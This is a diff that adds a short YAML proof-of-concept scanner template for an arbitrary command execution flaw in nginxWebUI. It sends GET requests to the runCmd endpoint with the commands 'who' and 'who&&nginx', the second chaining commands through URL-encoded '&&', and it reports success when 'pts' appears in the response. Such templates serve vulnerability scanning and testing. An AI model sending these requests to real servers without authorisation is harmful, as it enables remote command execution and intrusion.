@@ -1,0 +1,10 @@
+name: poc-yaml-nginxWebUI-runCmd
+description: "后台执行任意命令"
+method: GET
+path:
+  - /AdminPage/conf/runCmd?cmd=who
+  - /AdminPage/conf/runCmd?cmd=who%26%26nginx
+expression:
+  status: 200
+  body_any:
+    - "pts"
